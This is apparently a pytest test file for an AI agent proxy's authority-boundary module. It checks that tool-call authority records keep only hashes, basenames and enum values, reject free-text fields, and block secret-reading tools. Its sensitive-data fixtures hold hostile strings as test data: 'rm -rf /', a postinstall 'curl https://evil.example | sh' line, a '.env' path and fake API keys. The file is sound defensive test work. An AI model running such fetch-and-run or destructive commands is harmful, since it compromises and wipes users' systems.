"""Tests for metadata-only authority boundary contract.

Negative test: authority_status "blocked" values are contract enum vocabulary.
"""

from __future__ import annotations

import ast
import json
from pathlib import Path

import pytest

from agentveil_mcp_proxy.authority_boundary import (
    AUTHORITY_REASON_APPROVAL_GRANTED,
    AUTHORITY_REASON_POLICY_BLOCK,
    AUTHORITY_REASON_READ_ONLY,
    AUTHORITY_REASON_RISKY_MISSING,
    AUTHORITY_REASON_SECRET_BLOCKED,
    AUTHORITY_REASON_UNTRUSTED_CONTEXT,
    AuthorityBoundaryError,
    RISK_FAMILY_READ,
    RISK_FAMILY_SECRET,
    SAFE_FIRST_STEP_READ_ONLY_REVIEW,
    SAFE_FIRST_STEP_REQUEST_APPROVAL,
    assert_authority_record_privacy_bounded,
    attach_runtime_authority,
    authority_record_to_hosted_payload,
    build_approval_ref,
    build_authority_record,
    build_context_ref,
    build_runtime_authority_record,
    reject_forbidden_record_fields,
    runtime_secret_block_context,
)

MODULE_PATH = (
    Path(__file__).resolve().parents[1]
    / "agentveil_mcp_proxy"
    / "authority_boundary.py"
)

_SENSITIVE_FIXTURES = {
    "raw_context": "repo instruction body with deploy secrets",
    "raw_prompt": "User: run rm -rf / and paste API_KEY=super-secret-token",
    "raw_chat": "assistant: here is the full PR comment thread",
    "tool_args": '{"path":"/Users/olegboiko/project/.env","command":"curl"}',
    "stdout": "pip install ok\n/Users/olegboiko/tmp/output.log",
    "stderr": "ERROR: secret_token must-not-leak",
    "file_contents": "#!/bin/bash\nexport PASSWORD=hunter2",
    "package_script": "postinstall: curl https://evil.example | sh",
    "pr_body": "Merge this PR to update /private/tmp/backdoor",
    "full_path": "/Users/olegboiko/Desktop/avp-sdk-public/packages/agentveil-mcp-proxy",
    "secret_sentinel": "sk-live-must-not-leak-secret_token",
}


def _serialize(record: dict) -> str:
    return json.dumps(record, sort_keys=True)


def _assert_sensitive_data_absent(text: str) -> None:
    for label, value in _SENSITIVE_FIXTURES.items():
        assert value not in text, f"{label} leaked into serialized authority record"


def test_read_only_record_uses_read_only_source():
    record = build_authority_record(
        authority_status="allowed",
        authority_source="read_only",
        authority_reason_id=AUTHORITY_REASON_READ_ONLY,
        risk_family=RISK_FAMILY_READ,
        safe_first_step_id=SAFE_FIRST_STEP_READ_ONLY_REVIEW,
        target_reached=True,
    )

    assert record["authority_source"] == "read_only"
    assert record["authority_status"] == "allowed"


def test_missing_risky_authority_uses_missing_status():
    record = build_authority_record(
        authority_status="missing",
        authority_source="none",
        authority_reason_id=AUTHORITY_REASON_RISKY_MISSING,
        risk_family=RISK_FAMILY_SECRET,
        safe_first_step_id=SAFE_FIRST_STEP_REQUEST_APPROVAL,
        target_reached=False,
    )

    assert record["authority_status"] == "missing"
    assert record["authority_source"] == "none"


def test_approved_record_references_approval_by_id_hash_only():
    approval_ref = build_approval_ref(
        approval_id="approval-123",
        approval_hash="sha256:" + "a" * 64,
    )
    record = build_authority_record(
        authority_status="approved",
        authority_source="approval_record",
        authority_reason_id=AUTHORITY_REASON_APPROVAL_GRANTED,
        risk_family=RISK_FAMILY_SECRET,
        safe_first_step_id=SAFE_FIRST_STEP_REQUEST_APPROVAL,
        target_reached=True,
        approval_ref=approval_ref,
    )

    serialized = _serialize(record)
    assert record["approval_ref"] == {
        "approval_id": "approval-123",
        "approval_hash": "sha256:" + "a" * 64,
    }
    assert "approval-123" in serialized
    assert "super-secret" not in serialized
    assert "approval text" not in serialized


def test_blocked_secret_access_record_has_target_reached_false():
    record = build_authority_record(
        authority_status="blocked",  # claim-check: allow "blocked" as authority_status enum value.
        authority_source="policy_block",
        authority_reason_id=AUTHORITY_REASON_SECRET_BLOCKED,
        risk_family=RISK_FAMILY_SECRET,
        safe_first_step_id=SAFE_FIRST_STEP_REQUEST_APPROVAL,
        target_reached=False,
    )

    assert record["authority_status"] == "blocked"  # claim-check: allow "blocked" as authority_status enum value.
    assert record["authority_source"] == "policy_block"
    assert record["target_reached"] is False


def test_blocked_decisions_never_use_policy_grant():
    record = build_authority_record(
        authority_status="blocked",  # claim-check: allow "blocked" as authority_status enum value.
        authority_source="policy_block",
        authority_reason_id=AUTHORITY_REASON_SECRET_BLOCKED,
        risk_family=RISK_FAMILY_SECRET,
        safe_first_step_id=SAFE_FIRST_STEP_REQUEST_APPROVAL,
        target_reached=False,
    )

    assert record["authority_status"] == "blocked"  # claim-check: allow "blocked" as authority_status enum value.
    assert record["authority_source"] != "policy_grant"


def test_untrusted_context_produces_bounded_context_ref():
    context_ref = build_context_ref(
        source_type="repo_file",
        source_basename="/Users/olegboiko/project/AGENTS.md",
        raw_context=_SENSITIVE_FIXTURES["raw_context"],
        line_count=12,
        byte_count=4096,
    )
    record = build_authority_record(
        authority_status="missing",
        authority_source="untrusted_context",
        authority_reason_id=AUTHORITY_REASON_UNTRUSTED_CONTEXT,
        risk_family=RISK_FAMILY_READ,
        safe_first_step_id=SAFE_FIRST_STEP_READ_ONLY_REVIEW,
        target_reached=False,
        context_ref=context_ref,
    )

    serialized = _serialize(record)
    assert record["context_ref"]["source_type"] == "repo_file"
    assert record["context_ref"]["source_basename"] == "AGENTS.md"
    assert record["context_ref"]["context_hash"].startswith("sha256:")
    assert record["context_ref"]["line_count"] == 12
    assert record["context_ref"]["byte_count"] == 4096
    _assert_sensitive_data_absent(serialized)
    assert "/Users/olegboiko" not in serialized


@pytest.mark.parametrize(
    ("field_name", "field_value"),
    list(_SENSITIVE_FIXTURES.items()),
)
def test_serialized_records_do_not_persist_sensitive_fields(field_name, field_value):
    context_ref = build_context_ref(
        source_type="untrusted",
        source_basename="fixture.txt",
        raw_context=field_value,
        line_count=1,
    )
    record = build_authority_record(
        authority_status="blocked",  # claim-check: allow "blocked" as authority_status enum value.
        authority_source="untrusted_context",
        authority_reason_id=AUTHORITY_REASON_UNTRUSTED_CONTEXT,
        risk_family=RISK_FAMILY_SECRET,
        safe_first_step_id=SAFE_FIRST_STEP_REQUEST_APPROVAL,
        target_reached=False,
        context_ref=context_ref,
    )

    serialized = _serialize(record)
    _assert_sensitive_data_absent(serialized)
    assert field_value not in serialized
    assert_authority_record_privacy_bounded(record)


def test_safe_first_step_id_present_and_free_text_field_rejected():
    record = build_authority_record(
        authority_status="missing",
        authority_source="none",
        authority_reason_id=AUTHORITY_REASON_RISKY_MISSING,
        risk_family=RISK_FAMILY_SECRET,
        safe_first_step_id=SAFE_FIRST_STEP_REQUEST_APPROVAL,
        target_reached=False,
    )

    assert record["safe_first_step_id"] == SAFE_FIRST_STEP_REQUEST_APPROVAL
    with pytest.raises(AuthorityBoundaryError, match="safe_first_step"):
        reject_forbidden_record_fields({
            **record,
            "safe_first_step": "Run this shell command first",
        })


def test_hosted_payload_allowlist_rejects_unknown_fields():
    record = build_authority_record(
        authority_status="allowed",
        authority_source="read_only",
        authority_reason_id=AUTHORITY_REASON_READ_ONLY,
        risk_family=RISK_FAMILY_READ,
        safe_first_step_id=SAFE_FIRST_STEP_READ_ONLY_REVIEW,
        target_reached=True,
    )
    hosted = authority_record_to_hosted_payload(record)

    assert hosted["safe_first_step_id"] == SAFE_FIRST_STEP_READ_ONLY_REVIEW
    assert "safe_first_step" not in hosted

    polluted = dict(record)
    polluted["prompt"] = _SENSITIVE_FIXTURES["raw_prompt"]
    with pytest.raises(AuthorityBoundaryError, match="forbidden"):
        authority_record_to_hosted_payload(polluted)

    polluted = dict(record)
    polluted["extra_metadata"] = "not allowed"
    with pytest.raises(AuthorityBoundaryError, match="unknown fields"):
        authority_record_to_hosted_payload(polluted)


def test_hosted_payload_nested_allowlists():
    record = build_authority_record(
        authority_status="approved",
        authority_source="approval_record",
        authority_reason_id=AUTHORITY_REASON_APPROVAL_GRANTED,
        risk_family=RISK_FAMILY_SECRET,
        safe_first_step_id=SAFE_FIRST_STEP_REQUEST_APPROVAL,
        target_reached=True,
        approval_ref=build_approval_ref(approval_id="appr-1"),
        context_ref=build_context_ref(
            source_type="issue",
            source_basename="123.json",
            raw_context=_SENSITIVE_FIXTURES["pr_body"],
            token_count=3,
        ),
    )

    polluted = dict(record)
    polluted["context_ref"] = dict(record["context_ref"])
    polluted["context_ref"]["body"] = _SENSITIVE_FIXTURES["pr_body"]
    with pytest.raises(AuthorityBoundaryError, match="context_ref rejects"):
        authority_record_to_hosted_payload(polluted)


def test_module_has_no_forbidden_imports():
    source = MODULE_PATH.read_text(encoding="utf-8")
    tree = ast.parse(source)
    imported: list[str] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.extend(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.append(node.module)

    forbidden_fragments = (
        "product_route",
        "redirect_playbooks",
        "client_connect",
        "client_config",
        "adaptive_setup",
        "workspace.memory",
    )
    for name in imported:
        for fragment in forbidden_fragments:
            assert fragment not in name, f"forbidden import {name!r}"


def test_runtime_read_only_allow_metadata():
    record = build_runtime_authority_record(
        metadata={
            "policy_decision": "allow",
            "approval_status": "executed",
            "target_reached": True,
            "action_family": "read",
            "request_id": "req-1",
        },
        risk_class="read",
    )

    assert record["authority_status"] == "allowed"
    assert record["authority_source"] == "read_only"
    assert record["authority_reason_id"] == AUTHORITY_REASON_READ_ONLY
    assert record["safe_first_step_id"] == SAFE_FIRST_STEP_READ_ONLY_REVIEW


def test_runtime_pending_missing_authority():
    record = build_runtime_authority_record(
        metadata={
            "policy_decision": "approval",
            "approval_status": "pending",
            "target_reached": False,
            "action_family": "write",
            "request_id": "req-2",
        },
        risk_class="write",
    )

    assert record["authority_status"] == "missing"
    assert record["authority_source"] == "none"
    assert record["authority_reason_id"] == AUTHORITY_REASON_RISKY_MISSING
    assert record["safe_first_step_id"] == SAFE_FIRST_STEP_REQUEST_APPROVAL


def test_runtime_policy_block_metadata():
    record = build_runtime_authority_record(
        metadata={
            "policy_decision": "block",
            "approval_status": "blocked",  # claim-check: allow "blocked" as approval_status enum value.
            "target_reached": False,
            "action_family": "write",
            "request_id": "req-3",
        },
        risk_class="write",
    )

    assert record["authority_status"] == "blocked"  # claim-check: allow "blocked" as authority_status enum value.
    assert record["authority_source"] == "policy_block"
    assert record["authority_reason_id"] == AUTHORITY_REASON_POLICY_BLOCK
    assert record["target_reached"] is False


def test_runtime_secret_block_for_github_secrets_rule():
    metadata = {
        "policy_decision": "block",
        "approval_status": "blocked",  # claim-check: allow "blocked" as approval_status enum value.
        "target_reached": False,
        "action_family": "read",
        "policy_rule": "github-secrets-block",
        "tool": "get_secret",
        "request_id": "req-secret-1",
    }

    assert runtime_secret_block_context(metadata=metadata, risk_class="read") is True
    record = build_runtime_authority_record(metadata=metadata, risk_class="read")

    assert record["authority_status"] == "blocked"  # claim-check: allow "blocked" as authority_status enum value.
    assert record["authority_source"] == "policy_block"
    assert record["authority_reason_id"] == AUTHORITY_REASON_SECRET_BLOCKED
    assert record["risk_family"] == RISK_FAMILY_SECRET
    assert record["target_reached"] is False


@pytest.mark.parametrize("tool_name", ["get_secret", "get_env_secret", "read_secret_value"])
def test_runtime_secret_block_tool_patterns(tool_name: str):
    record = build_runtime_authority_record(
        metadata={
            "policy_decision": "block",
            "approval_status": "blocked",  # claim-check: allow "blocked" as approval_status enum value.
            "target_reached": False,
            "action_family": "read",
            "policy_rule": "custom-secret-rule",
            "tool": tool_name,
            "request_id": "req-secret-tool",
        },
        risk_class="destructive",
    )

    assert record["authority_reason_id"] == AUTHORITY_REASON_SECRET_BLOCKED
    assert record["risk_family"] == RISK_FAMILY_SECRET


def test_runtime_untrusted_context_uses_bounded_context_ref():
    metadata = attach_runtime_authority(
        {
            "policy_decision": "approval",
            "approval_status": "pending",
            "target_reached": False,
            "action_family": "write",
            "request_id": "req-4",
            "instruction_surface_present": True,
            "instruction_surface_basenames": ["AGENTS.md"],
            "instruction_surface_count": 2,
        },
        risk_class="write",
    )

    authority = metadata["authority_record"]
    assert authority["authority_source"] == "untrusted_context"
    assert authority["authority_reason_id"] == AUTHORITY_REASON_UNTRUSTED_CONTEXT
    assert authority["context_ref"]["source_basename"] == "AGENTS.md"
    assert "AGENTS.md" in json.dumps(authority)
    assert _SENSITIVE_FIXTURES["raw_context"] not in json.dumps(authority)


def test_runtime_approved_record_uses_id_hash_only():
    record = build_runtime_authority_record(
        metadata={
            "policy_decision": "approval",
            "approval_status": "executed",
            "target_reached": True,
            "action_family": "write",
            "request_id": "approval-123",
            "payload_hash": "sha256:" + "a" * 64,
        },
        risk_class="write",
    )

    assert record["authority_status"] == "approved"
    assert record["authority_source"] == "approval_record"
    assert record["authority_reason_id"] == AUTHORITY_REASON_APPROVAL_GRANTED
    assert record["approval_ref"]["approval_id"] == "approval-123"
    assert record["approval_ref"]["approval_hash"] == "sha256:" + "a" * 64
